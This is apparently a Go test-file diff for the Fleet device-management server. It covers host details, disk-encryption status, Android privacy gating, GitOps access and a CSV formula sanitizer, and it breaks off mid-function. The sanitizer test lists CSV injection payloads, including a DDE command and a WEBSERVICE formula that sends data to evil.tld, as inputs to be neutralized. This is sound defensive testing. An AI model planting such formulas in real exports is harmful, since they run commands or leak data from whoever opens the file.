@@ -13,6 +13,7 @@ import (
 	"net/http"
 	"net/http/httptest"
 	"strconv"
+	"strings"
 	"testing"
 	"time"
 
@@ -34,7 +35,10 @@ import (
 	"github.com/fleetdm/fleet/v4/server/mdm/apple/mobileconfig"
 	nanodep_client "github.com/fleetdm/fleet/v4/server/mdm/nanodep/client"
 	"github.com/fleetdm/fleet/v4/server/mdm/nanodep/tokenpki"
+	nanomdm "github.com/fleetdm/fleet/v4/server/mdm/nanomdm/mdm"
+	nanomdm_push "github.com/fleetdm/fleet/v4/server/mdm/nanomdm/push"
 	"github.com/fleetdm/fleet/v4/server/mock"
+	mdmmock "github.com/fleetdm/fleet/v4/server/mock/mdm"
 	nanodep_mock "github.com/fleetdm/fleet/v4/server/mock/nanodep"
 	"github.com/fleetdm/fleet/v4/server/test"
 	"github.com/jmoiron/sqlx"
@@ -118,10 +122,9 @@ func TestHostDetails(t *testing.T) {
 }
 
 // Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
-func TestHostDetailsMDMAppleDiskEncryption(t *testing.T) {
-	ds := new(mock.Store)
-	svc := &Service{ds: ds}
-
+// setupHostDetailsMDMAppleDiskEncryptionMocks stubs what getHostDetails touches
+// for a macOS host, except the config and profiles mocks each case sets.
+func setupHostDetailsMDMAppleDiskEncryptionMocks(ds *mock.Store) {
 	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
 		return &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true}}, nil
 	}
@@ -173,6 +176,17 @@ func TestHostDetailsMDMAppleDiskEncryption(t *testing.T) {
 	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*fleet.HostDeviceNameEnforcement, error) {
 		return nil, nil
 	}
+
+}
+
+func TestHostDetailsMDMAppleDiskEncryption(t *testing.T) {
+	ds := new(mock.Store)
+	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (fleet.DiskEncryptionConfig, error) {
+		return fleet.DiskEncryptionConfig{}, nil
+	}
+	svc := &Service{ds: ds}
+
+	setupHostDetailsMDMAppleDiskEncryptionMocks(ds)
 
 	cases := []struct {
 		name       string
@@ -405,11 +419,16 @@ func TestHostDetailsMDMAppleDiskEncryption(t *testing.T) {
 				require.Equal(t, c.wantState, *hostDetail.MDM.OSSettings.DiskEncryption.Status)
 				require.Equal(t, c.fvProf.Detail, hostDetail.MDM.OSSettings.DiskEncryption.Detail)
 			}
+			// os_settings is platform-agnostic and Windows populates its action_required, so the macOS path has to as
+			// well. Otherwise a client reading that one field is told a Mac needing a key rotation has nothing to do.
 			if c.wantAction == "" {
 				require.Nil(t, hostDetail.MDM.MacOSSettings.ActionRequired)
+				require.Nil(t, hostDetail.MDM.OSSettings.DiskEncryption.ActionRequired)
 			} else {
 				require.NotNil(t, hostDetail.MDM.MacOSSettings.ActionRequired)
 				require.Equal(t, c.wantAction, *hostDetail.MDM.MacOSSettings.ActionRequired)
+				require.NotNil(t, hostDetail.MDM.OSSettings.DiskEncryption.ActionRequired)
+				require.Equal(t, c.wantAction, *hostDetail.MDM.OSSettings.DiskEncryption.ActionRequired)
 			}
 			if c.wantStatus != nil {
 				require.NotNil(t, hostDetail.MDM.Profiles)
@@ -419,6 +438,89 @@ func TestHostDetailsMDMAppleDiskEncryption(t *testing.T) {
 			} else {
 				require.Nil(t, *hostDetail.MDM.Profiles)
 			}
+		})
+	}
+}
+
+func TestHostDetailsMDMAppleDiskEncryptionPerPlatformSettings(t *testing.T) {
+	ds := new(mock.Store)
+	svc := &Service{ds: ds}
+	setupHostDetailsMDMAppleDiskEncryptionMocks(ds)
+
+	bothOn := fleet.DiskEncryptionConfig{MacOSEnabled: true, MacOSEscrowEnabled: true}
+	enforceOnly := fleet.DiskEncryptionConfig{MacOSEnabled: true}
+	escrowOnly := fleet.DiskEncryptionConfig{MacOSEscrowEnabled: true}
+
+	installed := func(status fleet.MDMDeliveryStatus) *fleet.HostMDMAppleProfile {
+		return &fleet.HostMDMAppleProfile{
+			HostUUID:      "abc",
+			Identifier:    mobileconfig.FleetFileVaultPayloadIdentifier,
+			Status:        &status,
+			OperationType: fleet.MDMOperationTypeInstall,
+		}
+	}
+
+	cases := []struct {
+		name          string
+		cfg           fleet.DiskEncryptionConfig
+		rawDecrypt    *int
+		diskEncrypted *bool
+		fvProf        *fleet.HostMDMAppleProfile
+		wantState     fleet.DiskEncryptionStatus
+		wantAction    fleet.ActionRequiredState
+		wantStatus    fleet.MDMDeliveryStatus
+	}{
+		// enforce-only follows the disk state, the key is irrelevant
+		{"enforce only, verified profile, disk encrypted, no key", enforceOnly, new(-1), new(true), installed(fleet.MDMDeliveryVerified), fleet.DiskEncryptionVerified, "", fleet.MDMDeliveryVerified},
+		{"enforce only, verified profile, disk not encrypted", enforceOnly, new(-1), new(false), installed(fleet.MDMDeliveryVerified), fleet.DiskEncryptionActionRequired, fleet.ActionRequiredLogOut, fleet.MDMDeliveryPending},
+		{"enforce only, verified profile, disk state unknown", enforceOnly, new(-1), nil, installed(fleet.MDMDeliveryVerified), fleet.DiskEncryptionVerifying, "", fleet.MDMDeliveryVerifying},
+		{"enforce only, verifying profile, disk encrypted, undecryptable key", enforceOnly, new(0), new(true), installed(fleet.MDMDeliveryVerifying), fleet.DiskEncryptionVerifying, "", fleet.MDMDeliveryVerifying},
+		{"enforce only, verifying profile, disk not encrypted, decryptable key", enforceOnly, new(1), new(false), installed(fleet.MDMDeliveryVerifying), fleet.DiskEncryptionActionRequired, fleet.ActionRequiredLogOut, fleet.MDMDeliveryPending},
+		{"enforce only, pending profile, disk encrypted", enforceOnly, new(-1), new(true), installed(fleet.MDMDeliveryPending), fleet.DiskEncryptionEnforcing, "", fleet.MDMDeliveryPending},
+		// escrow (with or without enforce) follows the key, the disk state is irrelevant
+		{"escrow only, verified profile, decryptable key, disk not encrypted", escrowOnly, new(1), new(false), installed(fleet.MDMDeliveryVerified), fleet.DiskEncryptionVerified, "", fleet.MDMDeliveryVerified},
+		{"escrow only, verified profile, no key, disk encrypted", escrowOnly, new(-1), new(true), installed(fleet.MDMDeliveryVerified), fleet.DiskEncryptionActionRequired, fleet.ActionRequiredRotateKey, fleet.MDMDeliveryPending},
+		{"escrow only, verified profile, unchecked key", escrowOnly, nil, new(true), installed(fleet.MDMDeliveryVerified), fleet.DiskEncryptionVerifying, "", fleet.MDMDeliveryVerifying},
+		{"both on, verified profile, no key, disk encrypted", bothOn, new(-1), new(true), installed(fleet.MDMDeliveryVerified), fleet.DiskEncryptionActionRequired, fleet.ActionRequiredRotateKey, fleet.MDMDeliveryPending},
+		{"both on, verified profile, decryptable key, disk not encrypted", bothOn, new(1), new(false), installed(fleet.MDMDeliveryVerified), fleet.DiskEncryptionVerified, "", fleet.MDMDeliveryVerified},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			var mdmData fleet.MDMHostData
+			rawDecrypt := "null"
+			if c.rawDecrypt != nil {
+				rawDecrypt = strconv.Itoa(*c.rawDecrypt)
+			}
+			require.NoError(t, mdmData.Scan(fmt.Appendf(nil, `{"raw_decryptable": %s}`, rawDecrypt)))
+
+			host := &fleet.Host{ID: 3, MDM: mdmData, UUID: "abc", Platform: "darwin", DiskEncryptionEnabled: c.diskEncrypted}
+			ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (fleet.DiskEncryptionConfig, error) {
+				require.Nil(t, teamID)
+				return c.cfg, nil
+			}
+			ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]fleet.HostMDMAppleProfile, error) {
+				return []fleet.HostMDMAppleProfile{*c.fvProf}, nil
+			}
+
+			hostDetail, err := svc.getHostDetails(test.UserContext(t.Context(), test.UserAdmin), host, fleet.HostDetailOptions{})
+			require.NoError(t, err)
+			require.True(t, ds.GetConfigEnableDiskEncryptionFuncInvoked)
+			ds.GetConfigEnableDiskEncryptionFuncInvoked = false
+
+			require.NotNil(t, hostDetail.MDM.MacOSSettings)
+			require.NotNil(t, hostDetail.MDM.MacOSSettings.DiskEncryption)
+			require.Equal(t, c.wantState, *hostDetail.MDM.MacOSSettings.DiskEncryption)
+			require.NotNil(t, hostDetail.MDM.OSSettings.DiskEncryption.Status)
+			require.Equal(t, c.wantState, *hostDetail.MDM.OSSettings.DiskEncryption.Status)
+			if c.wantAction == "" {
+				require.Nil(t, hostDetail.MDM.MacOSSettings.ActionRequired)
+			} else {
+				require.NotNil(t, hostDetail.MDM.MacOSSettings.ActionRequired)
+				require.Equal(t, c.wantAction, *hostDetail.MDM.MacOSSettings.ActionRequired)
+			}
+			profs := *hostDetail.MDM.Profiles
+			require.Len(t, profs, 1)
+			require.EqualValues(t, c.wantStatus, *profs[0].Status)
 		})
 	}
 }
@@ -491,9 +593,10 @@ func TestHostDetailsMDMTimestamps(t *testing.T) {
 	ts2 := time.Now().Add(-2 * time.Hour).UTC()
 	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*fleet.NanoMDMEnrollmentDetails, error) {
 		return &fleet.NanoMDMEnrollmentDetails{
-			LastMDMEnrollmentTime: &ts1,
-			LastMDMSeenTime:       &ts2,
-			HardwareAttested:      false,
+			LastMDMEnrollmentTime:  &ts1,
+			LastMDMSeenTime:        &ts2,
+			HardwareAttested:       false,
+			BootstrapTokenEscrowed: true,
 		}, nil
 	}
 
@@ -533,19 +636,19 @@ func TestHostDetailsMDMTimestamps(t *testing.T) {
 				assert.Nil(t, hostDetail.LastMDMEnrolledAt)
 				assert.Nil(t, hostDetail.LastMDMCheckedInAt)
 			}
+			if testcase.platform == "darwin" {
+				require.NotNil(t, hostDetail.MDM.BootstrapTokenEscrowed)
+				assert.True(t, *hostDetail.MDM.BootstrapTokenEscrowed)
+			} else {
+				assert.Nil(t, hostDetail.MDM.BootstrapTokenEscrowed)
+			}
 		})
 	}
 }
 
-// TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment is a regression test:
-// BYOD/personal enrollments never receive the device vitals fields (see
-// byodDeviceInformationQueryKeys in server/mdm/apple/commander.go), so
-// getHostDetails shouldn't even load them -- both to avoid an unnecessary
-// datastore call and so a personal host's response can't carry data it was
-// never supposed to have.
-func TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment(t *testing.T) {
-	ds := new(mock.Store)
-	svc := &Service{ds: ds}
+// mockHostDetailsDatastore stubs out the datastore calls getHostDetails makes
+// for every host, so that a test only has to set up the ones it asserts on.
+func mockHostDetailsDatastore(ds *mock.Store) {
 	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
 		return &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true}}, nil
 	}
@@ -559,9 +662,9 @@ func TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment(t *testing.T) {
 		return nil
 	}
 	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *fleet.Host) error {
-		host.HostMDMAppleDeviceVitals = fleet.HostMDMAppleDeviceVitals{
-			PushToken: []byte("sensitive-push-token"),
-		}
+		return nil
+	}
+	ds.LoadHostMDMAndroidDeviceVitalsFunc = func(ctx context.Context, host *fleet.Host) error {
 		return nil
 	}
 	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *fleet.Host) ([]*fleet.HostPolicy, error) {
@@ -615,6 +718,24 @@ func TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment(t *testing.T) {
 	ds.GetHostMDMAppleEnrollmentPermissionsFunc = func(ctx context.Context, hostUUID string) (*fleet.HostMDMApplePermissions, error) {
 		return nil, nil
 	}
+}
+
+// TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment is a regression test:
+// BYOD/personal enrollments never receive the device vitals fields (see
+// byodDeviceInformationQueryKeys in server/mdm/apple/commander.go), so
+// getHostDetails shouldn't even load them -- both to avoid an unnecessary
+// datastore call and so a personal host's response can't carry data it was
+// never supposed to have.
+func TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment(t *testing.T) {
+	ds := new(mock.Store)
+	svc := &Service{ds: ds}
+	mockHostDetailsDatastore(ds)
+	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *fleet.Host) error {
+		host.HostMDMAppleDeviceVitals = fleet.HostMDMAppleDeviceVitals{
+			PushToken: []byte("sensitive-push-token"),
+		}
+		return nil
+	}
 
 	personal := fleet.MDMEnrollmentStatusPersonal
 	manual := fleet.MDMEnrollmentStatusManual
@@ -645,6 +766,124 @@ func TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment(t *testing.T) {
 				assert.Equal(t, []byte("sensitive-push-token"), hostDetail.PushToken)
 			} else {
 				assert.Equal(t, fleet.HostMDMAppleDeviceVitals{}, hostDetail.HostMDMAppleDeviceVitals)
+			}
+		})
+	}
+}
+
+// TestHostDetailsSuppressesAndroidPhoneNumberForBYOD checks that a
+// personally-owned Android host never surfaces a phone number or a hardware
+// radio identifier, whatever ended up stored: ingestion gates on the
+// device-reported ownership, which AMAPI may omit, so the response is gated on
+// Fleet's own enrollment record.
+func TestHostDetailsSuppressesAndroidSensitiveVitalsForBYOD(t *testing.T) {
+	ds := new(mock.Store)
+	svc := &Service{ds: ds}
+	mockHostDetailsDatastore(ds)
+
+	ds.LoadHostMDMAndroidDeviceVitalsFunc = func(ctx context.Context, host *fleet.Host) error {
+		host.HostMDMAndroidDeviceVitals = fleet.HostMDMAndroidDeviceVitals{
+			Manufacturer:   new("Google"),
+			IMEI:           new("A1000031212"),
+			MEID:           new("A00000292788E1"),
+			TelephonyInfos: []fleet.MDMAndroidTelephonyInfo{{PhoneNumber: "+15555550100"}},
+		}
+		return nil
+	}
+
+	personal := fleet.MDMEnrollmentStatusPersonal
+	manual := fleet.MDMEnrollmentStatusManual
+	off := fleet.MDMEnrollmentStatusOff
+
+	cases := []struct {
+		name                 string
+		enrollmentStatus     *string
+		isPersonalEnrollment bool
+		wantSensitiveVitals  bool
+	}{
+		{"personal enrollment", &personal, true, false},
+		{"company owned", &manual, false, true},
+		// enrollment_status is a generated column that reads "Off" once the
+		// host unenrolls, but the vitals row and the BYOD classification both
+		// outlive the enrollment, so this must stay suppressed.
+		{"unenrolled BYOD", &off, true, false},
+		{"unenrolled company owned", &off, false, true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			host := &fleet.Host{
+				ID:       5,
+				Platform: "android",
+				UUID:     "android-byod-uuid",
+				MDM: fleet.MDMHostData{
+					EnrollmentStatus:     tc.enrollmentStatus,
+					IsPersonalEnrollment: tc.isPersonalEnrollment,
+				},
+			}
+			opts := fleet.HostDetailOptions{ExcludeSoftware: true}
+			hostDetail, err := svc.getHostDetails(test.UserContext(t.Context(), test.UserAdmin), host, opts)
+			require.NoError(t, err)
+			// The other vitals load either way; only the phone number and the
+			// radio identifiers are gated.
+			assert.Equal(t, "Google", *hostDetail.Manufacturer)
+			if tc.wantSensitiveVitals {
+				assert.Len(t, hostDetail.TelephonyInfos, 1)
+				assert.Equal(t, "A1000031212", *hostDetail.IMEI)
+				assert.Equal(t, "A00000292788E1", *hostDetail.MEID)
+			} else {
+				assert.Nil(t, hostDetail.TelephonyInfos)
+				assert.Nil(t, hostDetail.IMEI)
+				assert.Nil(t, hostDetail.MEID)
+			}
+		})
+	}
+}
+
+// TestHostDetailsLoadsAndroidDeviceVitals checks that the Android-only vitals
+// are loaded for Android hosts and for nothing else, so that a host on another
+// platform can't carry Android fields in its response.
+func TestHostDetailsLoadsAndroidDeviceVitals(t *testing.T) {
+	ds := new(mock.Store)
+	svc := &Service{ds: ds}
+	mockHostDetailsDatastore(ds)
+
+	ds.LoadHostMDMAndroidDeviceVitalsFunc = func(ctx context.Context, host *fleet.Host) error {
+		host.HostMDMAndroidDeviceVitals = fleet.HostMDMAndroidDeviceVitals{
+			Manufacturer: new("Google"),
+			APILevel:     new(int64(36)),
+			IMEI:         new("A1000031212"),
+		}
+		return nil
+	}
+
+	cases := []struct {
+		name             string
+		platform         string
+		wantVitalsLoaded bool
+	}{
+		{"android host", "android", true},
+		{"darwin host", "darwin", false},
+		{"ipados host", "ipados", false},
+		{"windows host", "windows", false},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			ds.LoadHostMDMAndroidDeviceVitalsFuncInvoked = false
+			host := &fleet.Host{
+				ID:       4,
+				Platform: tc.platform,
+				UUID:     "android-vitals-uuid",
+			}
+			opts := fleet.HostDetailOptions{ExcludeSoftware: true}
+			hostDetail, err := svc.getHostDetails(test.UserContext(t.Context(), test.UserAdmin), host, opts)
+			require.NoError(t, err)
+			assert.Equal(t, tc.wantVitalsLoaded, ds.LoadHostMDMAndroidDeviceVitalsFuncInvoked)
+			if tc.wantVitalsLoaded {
+				assert.Equal(t, "Google", *hostDetail.Manufacturer)
+				assert.Equal(t, int64(36), *hostDetail.APILevel)
+				assert.Equal(t, "A1000031212", *hostDetail.IMEI)
+			} else {
+				assert.Equal(t, fleet.HostMDMAndroidDeviceVitals{}, hostDetail.HostMDMAndroidDeviceVitals)
 			}
 		})
 	}
@@ -910,6 +1149,9 @@ func TestHostDetailsOSSettingsWindowsOnly(t *testing.T) {
 
 func TestHostDetailsRecoveryLockPasswordStatus(t *testing.T) {
 	ds := new(mock.Store)
+	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (fleet.DiskEncryptionConfig, error) {
+		return fleet.DiskEncryptionConfig{}, nil
+	}
 	svc := &Service{ds: ds}
 
 	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Label, error) {
@@ -1029,6 +1271,9 @@ func TestHostDetailsRecoveryLockPasswordStatus(t *testing.T) {
 
 func TestHostDetailsHostNameStatus(t *testing.T) {
 	ds := new(mock.Store)
+	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (fleet.DiskEncryptionConfig, error) {
+		return fleet.DiskEncryptionConfig{}, nil
+	}
 	svc := &Service{ds: ds}
 
 	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Label, error) { return nil, nil }
@@ -1162,6 +1407,9 @@ func TestHostDetailsHostNameStatus(t *testing.T) {
 
 func TestHostDetailsOSUpdates(t *testing.T) {
 	ds := new(mock.Store)
+	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (fleet.DiskEncryptionConfig, error) {
+		return fleet.DiskEncryptionConfig{}, nil
+	}
 	svc := &Service{ds: ds}
 
 	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Label, error) { return nil, nil }
@@ -1712,6 +1960,138 @@ func TestHostAuth(t *testing.T) {
 	// List, GetHostSummary work for all
 }
 
+// TestHostByIdentifierGitOpsGetsIDOnly asserts that GitOps, which is denied on
+// every other host read endpoint, doesn't get host details from the identifier
+// endpoint either: it only gets the host id it needs to resolve an identifier
+// for the deprecated Puppet module's profile pre-assignment flow.
+func TestHostByIdentifierGitOpsGetsIDOnly(t *testing.T) {
+	ds := new(mock.Store)
+	svc, ctx := newTestService(t, ds, nil, nil)
+
+	const (
+		teamHostIdentifier   = "team-host"
+		globalHostIdentifier = "global-host"
+	)
+	teamHost := &fleet.Host{ID: 1, TeamID: new(uint(1)), Hostname: "team-host.example.com", HardwareSerial: "TEAMSERIAL", UUID: "team-uuid"}
+	globalHost := &fleet.Host{ID: 2, Hostname: "global-host.example.com", HardwareSerial: "GLOBALSERIAL", UUID: "global-uuid"}
+
+	ds.HostByIdentifierFunc = func(ctx context.Context, identifier string) (*fleet.Host, error) {
+		if identifier == teamHostIdentifier {
+			return teamHost, nil
+		}
+		return globalHost, nil
+	}
+	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+		return &fleet.AppConfig{}, nil
+	}
+	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *fleet.Host, includeCVEScores bool) error {
+		return nil
+	}
+	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Label, error) {
+		return nil, nil
+	}
+	ds.ListPacksForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Pack, error) {
+		return nil, nil
+	}
+	ds.ListHostBatteriesFunc = func(ctx context.Context, hid uint) ([]*fleet.HostBattery, error) {
+		return nil, nil
+	}
+	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*fleet.HostMaintenanceWindow, error) {
+		return nil, nil
+	}
+	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *fleet.Host) ([]*fleet.HostPolicy, error) {
+		return nil, nil
+	}
+	ds.ListHostDeviceMappingFunc = func(ctx context.Context, hid uint) ([]*fleet.HostDeviceMapping, error) {
+		return nil, nil
+	}
+	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*fleet.ScimUser, error) {
+		return nil, nil
+	}
+	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]fleet.HostCustomHostVital, error) {
+		return nil, nil
+	}
+	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
+		return nil, nil
+	}
+	ds.GetHostIssuesLastUpdatedFunc = func(ctx context.Context, hostID uint) (time.Time, error) {
+		return time.Time{}, nil
+	}
+	ds.UpdateHostIssuesFailingPoliciesForSingleHostFunc = func(ctx context.Context, hostID uint) error {
+		return nil
+	}
+	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
+		return false, nil
+	}
+	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *fleet.Host) (*fleet.HostLockWipeStatus, error) {
+		return &fleet.HostLockWipeStatus{}, nil
+	}
+
+	// requireIDOnly asserts the caller got the host id and no other host data,
+	// and that Fleet didn't even load the details it isn't allowed to see.
+	requireIDOnly := func(t *testing.T, wantID uint, host *fleet.HostDetail, err error) {
+		t.Helper()
+		require.NoError(t, err)
+		require.NotNil(t, host)
+		require.True(t, host.IDOnly)
+		require.Equal(t, wantID, host.ID)
+		require.Empty(t, host.Hostname)
+		require.Empty(t, host.HardwareSerial)
+		require.Empty(t, host.UUID)
+		require.Nil(t, host.TeamID)
+		require.Nil(t, host.Labels)
+		require.Nil(t, host.Packs)
+		require.False(t, ds.LoadHostSoftwareFuncInvoked)
+		require.False(t, ds.ListLabelsForHostFuncInvoked)
+		require.False(t, ds.ListPoliciesForHostFuncInvoked)
+	}
+
+	opts := fleet.HostDetailOptions{IncludePolicies: true}
+
+	t.Run("global gitops", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{ID: 1, GlobalRole: new(fleet.RoleGitOps)}})
+
+		host, err := svc.HostByIdentifier(ctx, globalHostIdentifier, opts)
+		requireIDOnly(t, globalHost.ID, host, err)
+
+		host, err = svc.HostByIdentifier(ctx, teamHostIdentifier, opts)
+		requireIDOnly(t, teamHost.ID, host, err)
+	})
+
+	t.Run("team gitops on the host's team", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{
+			ID:    2,
+			Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 1}, Role: fleet.RoleGitOps}},
+		}})
+
+		host, err := svc.HostByIdentifier(ctx, teamHostIdentifier, opts)
+		requireIDOnly(t, teamHost.ID, host, err)
+	})
+
+	t.Run("team gitops on another team is denied", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{
+			ID:    3,
+			Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 2}, Role: fleet.RoleGitOps}},
+		}})
+
+		_, err := svc.HostByIdentifier(ctx, teamHostIdentifier, opts)
+		checkAuthErr(t, true, err)
+	})
+
+	// Roles that do have host read access must keep getting the full details.
+	t.Run("global observer still gets details", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{ID: 4, GlobalRole: new(fleet.RoleObserver)}})
+
+		host, err := svc.HostByIdentifier(ctx, globalHostIdentifier, opts)
+		require.NoError(t, err)
+		require.Equal(t, uint(2), host.ID)
+		require.Equal(t, "global-host.example.com", host.Hostname)
+		require.Equal(t, "GLOBALSERIAL", host.HardwareSerial)
+		require.True(t, ds.ListLabelsForHostFuncInvoked)
+		require.True(t, ds.ListPoliciesForHostFuncInvoked)
+	})
+}
+
 func TestListHosts(t *testing.T) {
 	ds := new(mock.Store)
 	svc, ctx := newTestService(t, ds, nil, nil)
@@ -1762,6 +2142,62 @@ func TestListHosts(t *testing.T) {
 	require.NoError(t, err)
 	require.Len(t, hosts, 1)
 	require.True(t, ds.LoadHostSoftwareFuncInvoked)
+}
+
+func TestSanitizeCSVFormula(t *testing.T) {
+	t.Parallel()
+
+	cases := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"empty", "", ""},
+		{"equals", "=1+1", "'=1+1"},
+		{"plus", "+SUM(1,1)", "'+SUM(1,1)"},
+		{"minus", "-2+3", "'-2+3"},
+		{"at", "@SUM(1,1)", "'@SUM(1,1)"},
+		{"dde command", `=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
+		{"webservice exfiltration", `=WEBSERVICE("http://evil.tld/?x="&A1)`, `'=WEBSERVICE("http://evil.tld/?x="&A1)`},
+		{"tab", "\t=1+1", "'\t=1+1"},
+		{"carriage return", "\r=1+1", "'\r=1+1"},
+		{"hyphen leading text", "-laptop", "'-laptop"},
+		{"leading space", " =1+1", "' =1+1"},
+		{"leading spaces", "   @SUM(1,1)", "'   @SUM(1,1)"},
+		{"newline then formula", "\n=1+1", "'\n=1+1"},
+
+		// Values that must be left untouched.
+		{"whitespace only", "   ", "   "},
+		{"tab then text", "\tfoo", "\tfoo"},
+		{"leading space then number", " -1", " -1"},
+		{"trailing space after number", "-5 ", "-5 "},
+		{"integer", "42", "42"},
+		{"negative integer", "-1", "-1"},
+		{"negative float", "-1.5", "-1.5"},
+		{"positive sign", "+1", "+1"},
+		{"negative exponent", "-1.5e10", "-1.5e10"},
+		{"email", "user@example.com", "user@example.com"},
+		{"timestamp", "2022-03-15T17:23:56Z", "2022-03-15T17:23:56Z"},
+		{"hostname", "foo.local0", "foo.local0"},
+		{"zero", "0", "0"},
+		{"internal equals", "a=1+1", "a=1+1"},
+		{"newline leading", "\nfoo", "\nfoo"},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			t.Parallel()
+			require.Equal(t, c.want, sanitizeCSVFormula(c.in))
+		})
+	}
+
+	t.Run("already sanitized values are left alone", func(t *testing.T) {
+		t.Parallel()
+		// The single quote is not a formula trigger, so re-applying the
+		// transformation must not stack prefixes.
+		once := sanitizeCSVFormula("=1+1")
+		require.Equal(t, once, sanitizeCSVFormula(once))
+	})
 }
 
 func TestStreamHosts(t *testing.T) {
@@ -3213,6 +3649,132 @@ func TestRefetchHostUserInTeams(t *testing.T) {
 	assert.True(t, ds.UpdateHostRefetchRequestedFuncInvoked)
 }
 
+func refetchCommandTypeFromUUID(commandUUID string) string {
+	for _, prefix := range []string{
+		fleet.RefetchAppsCommandUUIDPrefix,
+		fleet.RefetchCertsCommandUUIDPrefix,
+		fleet.RefetchDeviceCommandUUIDPrefix,
+	} {
+		if strings.HasPrefix(commandUUID, prefix) {
+			return prefix
+		}
+	}
+	return commandUUID
+}
+
+func TestRefetchHostIOSTracksBeforeEnqueue(t *testing.T) {
+	host := &fleet.Host{ID: 7, Platform: "ios", UUID: "ios-host-uuid"}
+
+	type testEnv struct {
+		ds         *mock.Store
+		mdmStorage *mdmmock.MDMAppleStore
+		svc        fleet.Service
+		ctx        context.Context
+		events     []string
+	}
+
+	setup := func(t *testing.T, pusher nanomdm_push.Pusher) *testEnv {
+		env := &testEnv{
+			ds:         new(mock.Store),
+			mdmStorage: &mdmmock.MDMAppleStore{},
+		}
+		env.svc, env.ctx = newTestService(t, env.ds, nil, nil, &TestServerOpts{
+			MDMStorage: env.mdmStorage,
+			MDMPusher:  pusher,
+		})
+
+		env.ds.HostLiteFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
+			return host, nil
+		}
+		env.ds.UpdateHostRefetchRequestedFunc = func(ctx context.Context, id uint, value bool) error {
+			return nil
+		}
+		env.ds.GetHostMDMCommandsFunc = func(ctx context.Context, hostID uint) ([]fleet.HostMDMCommand, error) {
+			return nil, nil
+		}
+		env.ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+			return &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true}}, nil
+		}
+		env.ds.IsHostConnectedToFleetMDMFunc = func(ctx context.Context, h *fleet.Host) (bool, error) {
+			return true, nil
+		}
+		env.ds.GetHostMDMFunc = func(ctx context.Context, hostID uint) (*fleet.HostMDM, error) {
+			return &fleet.HostMDM{InstalledFromDep: true}, nil
+		}
+		env.ds.GetHostDEPAssignmentFunc = func(ctx context.Context, hostID uint) (*fleet.HostDEPAssignment, error) {
+			return nil, &notFoundError{}
+		}
+		env.ds.GetHostLockWipeStatusFunc = func(ctx context.Context, h *fleet.Host) (*fleet.HostLockWipeStatus, error) {
+			return &fleet.HostLockWipeStatus{}, nil
+		}
+		env.ds.AddHostMDMCommandsFunc = func(ctx context.Context, commands []fleet.HostMDMCommand) error {
+			for _, cmd := range commands {
+				require.Equal(t, host.ID, cmd.HostID)
+				env.events = append(env.events, "add:"+cmd.CommandType)
+			}
+			return nil
+		}
+		env.ds.RemoveHostMDMCommandFunc = func(ctx context.Context, command fleet.HostMDMCommand) error {
+			require.Equal(t, host.ID, command.HostID)
+			env.events = append(env.events, "remove:"+command.CommandType)
+			return nil
+		}
